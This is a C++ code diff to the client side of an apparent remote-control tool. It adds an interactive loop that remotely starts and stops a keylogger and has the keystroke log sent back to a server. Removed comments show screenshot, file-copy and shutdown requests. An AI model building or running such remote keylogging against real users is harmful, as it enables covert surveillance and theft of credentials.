@@ -32,17 +32,31 @@ int main(int argc, char* argv[]) {
         }
     } else if (argc == 2 && std::string(argv[1]) == "client") {
         // Start client
-        Client client("10.122.1.81", 54000);
+        Client client("192.168.2.2", 54002);
         if (client.connectToServer()) {
-            // client.sendShutdownRequest();
-            // client.sendScreenshotRequest();
-            // client.sendFileCopyRequest("README.md", "copy_README.md");
-            client.sendKeyloggerStartRequest();
-            std::cout << "pres Y to turn off: ";
-            char str;
-            std::cin >> str;
-            if(str == 'Y')
-                client.sendKeyloggerOffRequest();
+            std::string command;
+            while (true) {
+                std::cout << "Enter 'start' to start keylogger, 'stop' to stop keylogger, or 'exit' to quit: ";
+                std::cin >> command;
+
+                if (command == "start") {
+                    client.sendKeyloggerStartRequest();
+                    std::cout << "Keylogger started." << std::endl;
+                } 
+                else if (command == "stop") {
+                    client.sendKeyloggerOffRequest();
+                    std::cout << "Keylogger stopped and log file sent to server." << std::endl;
+                } 
+                else if (command == "exit") {
+                    break;  // Exit the loop and end the client session
+                } 
+                else {
+                    std::cout << "Unknown command. Try 'start', 'stop', or 'exit'." << std::endl;
+                }
+
+                // Optional delay between commands
+                std::this_thread::sleep_for(std::chrono::seconds(1));
+            }
         }
     } else {
         std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
